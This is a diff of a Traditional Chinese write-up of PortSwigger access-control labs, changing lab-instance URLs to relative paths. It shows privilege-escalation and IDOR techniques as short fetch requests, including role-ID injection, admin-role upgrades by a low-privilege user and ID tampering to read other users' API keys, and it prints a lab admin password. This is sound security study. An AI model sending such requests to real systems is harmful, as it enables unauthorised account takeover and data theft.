@@ -12,14 +12,14 @@ last_update:
 | Document  | https://portswigger.net/web-security/access-control#unprotected-functionality           |
 | Lab       | https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality |
 
-訪問 https://0a1500b104bc0be580d0ee1e005c00f0.web-security-academy.net/robots.txt ，看到
+訪問 `/robots.txt` ，看到
 
 ```
 User-agent: *
 Disallow: /administrator-panel
 ```
 
-訪問 https://0a1500b104bc0be580d0ee1e005c00f0.web-security-academy.net/administrator-panel ，成功刪除使用者
+訪問 `/administrator-panel` ，成功刪除使用者
 
 我之前就有用 `robots.txt` 成功發現一個網站的 `/admin` 路由，並且成功找到 SQLi 的漏洞，詳細可參考 [ZD-2025-01022](https://zeroday.hitcon.org/vulnerability/ZD-2025-01022)
 
@@ -71,21 +71,17 @@ Cookie 有 `Admin: false`，改成 `true` 就可以成功訪問 `/admin`
 但如果沒有題目給的 hint 說 `roleid: 2`，根本不知道會有這個節點啊（？
 
 ```js
-fetch(
-  "https://0a1900e104f2117d813f07a500f200fc.web-security-academy.net/my-account/change-email",
-  {
-    headers: {
-      "content-type": "text/plain;charset=UTF-8",
-    },
-    body: JSON.stringify({
-      email: "wiener@normal-user.net",
-      roleid: 2,
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/my-account/change-email`, {
+  headers: {
+    "content-type": "text/plain;charset=UTF-8",
   },
-);
+  body: JSON.stringify({
+    email: "wiener@normal-user.net",
+    roleid: 2,
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 ## Lab: URL-based access control can be circumvented
@@ -153,7 +149,6 @@ fetch(`${location.origin}/admin-roles`, {
   },
   body: "username=carlos&action=upgrade",
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -181,7 +176,7 @@ fetch(`${location.origin}/admin-roles?username=wiener&action=upgrade`);
 - File Extension `/admin/deleteUser.anything` => `/admin/deleteUser`
 - Trailing Slash `/admin/deleteUser/` => `/admin/deleteUser`
 
-訪問 `https://0a52004f035c8b3882635c1f00e900c8.web-security-academy.net/my-account?id=carlos`，成功得到 carlos 的 API Key
+訪問 `/my-account?id=carlos`，成功得到 carlos 的 API Key
 
 ## Lab: User ID controlled by request parameter, with unpredictable user IDs
 
@@ -190,11 +185,11 @@ fetch(`${location.origin}/admin-roles?username=wiener&action=upgrade`);
 | Document  | https://portswigger.net/web-security/access-control#horizontal-privilege-escalation                                         |
 | Lab       | https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids |
 
-用預設帳密登入後，可以看到 https://0a0e00a604c82a40829ad81900a500f5.web-security-academy.net/my-account?id=1d0d7b4b-b1d4-474d-b821-83d74a423531
+用預設帳密登入後，可以看到 `/my-account?id=1d0d7b4b-b1d4-474d-b821-83d74a423531`
 
-在 blog 頁面找到 carlos 的 userid https://0a0e00a604c82a40829ad81900a500f5.web-security-academy.net/blogs?userId=89698705-87d4-4e8e-8bbc-27eb9139b859
+在 blog 頁面找到 carlos 的 userid `/blogs?userId=89698705-87d4-4e8e-8bbc-27eb9139b859`
 
-訪問 https://0a0e00a604c82a40829ad81900a500f5.web-security-academy.net/my-account?id=89698705-87d4-4e8e-8bbc-27eb9139b859 ，成功～
+訪問 `/my-account?id=89698705-87d4-4e8e-8bbc-27eb9139b859` ，成功～
 
 ## Lab: User ID controlled by request parameter with data leakage in redirect
 
@@ -206,9 +201,7 @@ fetch(`${location.origin}/admin-roles?username=wiener&action=upgrade`);
 嘗試
 
 ```js
-fetch(
-  "https://0aec00c904d182a8803949bb00070040.web-security-academy.net/my-account?id=carlos",
-);
+fetch(`${location.origin}/my-account?id=carlos`);
 ```
 
 有看到 302 redirect 的 HTTP Response Header 有 `content-length: 1176`，但瀏覽器會顯示 `No content available because this request was redirected`，所以改用 Burp Suite 來查看，成功看到 API Key
@@ -220,7 +213,7 @@ fetch(
 | Document  | https://portswigger.net/web-security/access-control#horizontal-to-vertical-privilege-escalation                          |
 | Lab       | https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure |
 
-先訪問 https://0a2800a20449487a8008762700280042.web-security-academy.net/my-account?id=administrator ，拿到帳密是 `administrator:r1ym10nfv5xdn7gq3rwu`
+先訪問 `/my-account?id=administrator` ，拿到帳密是 `administrator:r1ym10nfv5xdn7gq3rwu`
 
 是說，這樣的設計模式（密碼明文儲存 + 訪問 my-account 頁面時，密碼會預設填在輸入框），我還真的在某個網站看過，能設計出這種架構的，真的是神人吧...
 
@@ -231,9 +224,9 @@ fetch(
 | Document  | https://portswigger.net/web-security/access-control#insecure-direct-object-references     |
 | Lab       | https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references |
 
-觀察 `/chat` 頁面的 View transcript 功能，下載的 URL 是 https://0a51007303b1741285f0856f009b0053.web-security-academy.net/download-transcript/2.txt
+觀察 `/chat` 頁面的 View transcript 功能，下載的 URL 是 `/download-transcript/2.txt`
 
-之後每次都會遞增，所以我們可以嘗試訪問 https://0a51007303b1741285f0856f009b0053.web-security-academy.net/download-transcript/1.txt
+之後每次都會遞增，所以我們可以嘗試訪問 `/download-transcript/1.txt`
 
 ```
 CONNECTED: -- Now chatting with Hal Pline --
@@ -265,7 +258,6 @@ fetch(`${location.origin}/admin-roles`, {
   },
   body: "action=upgrade&confirmed=true&username=carlos",
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -279,7 +271,6 @@ fetch(`${location.origin}/admin-roles`, {
   },
   body: "action=upgrade&confirmed=true&username=wiener",
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -294,17 +285,13 @@ fetch(`${location.origin}/admin-roles`, {
 先用 admin 帳密登入，確定最後是戳
 
 ```js
-fetch(
-  "https://0a2a00cf03f4400d83de2d1f002400fb.web-security-academy.net/admin-roles?username=carlos&action=upgrade",
-);
+fetch(`${location.origin}/admin-roles?username=carlos&action=upgrade`);
 ```
 
-登入 wiener 帳密後，進到 https://0a2a00cf03f4400d83de2d1f002400fb.web-security-academy.net/admin ，並且嘗試
+登入 wiener 帳密後，進到 `/admin` ，並且嘗試
 
 ```js
-fetch(
-  "https://0a2a00cf03f4400d83de2d1f002400fb.web-security-academy.net/admin-roles?username=wiener&action=upgrade",
-);
+fetch(`${location.origin}/admin-roles?username=wiener&action=upgrade`);
 ```
 
 ## 小結
